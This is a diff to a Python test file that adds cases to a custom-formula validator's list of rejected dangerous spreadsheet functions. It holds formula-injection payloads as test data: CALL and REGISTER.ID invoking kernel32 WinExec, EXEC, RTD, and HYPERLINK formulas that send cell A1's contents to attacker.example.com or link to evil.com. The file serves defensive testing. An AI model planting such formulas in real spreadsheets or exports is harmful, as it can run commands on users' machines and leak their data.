@@ -79,6 +79,9 @@ class TestValidateCustomFormula:
             '=CALL("kernel32","WinExec","JCJ","calc.exe",5)',
             '=REGISTER.ID("kernel32","WinExec","JCJ")',
             '=EXEC("calc.exe")',
+            '=HYPERLINK("https://attacker.example.com/?d="&A1,"click here")',
+            '=hyperlink("https://evil.com","link")',
+            '=RTD("progid",,"topic1")',
         ],
         ids=[
             "WEBSERVICE_upper",
@@ -93,6 +96,9 @@ class TestValidateCustomFormula:
             "CALL",
             "REGISTER_ID",
             "EXEC",
+            "HYPERLINK_upper",
+            "hyperlink_lower",
+            "RTD",
         ],
     )
     def test_rejects_dangerous_functions(self, formula: str) -> None:
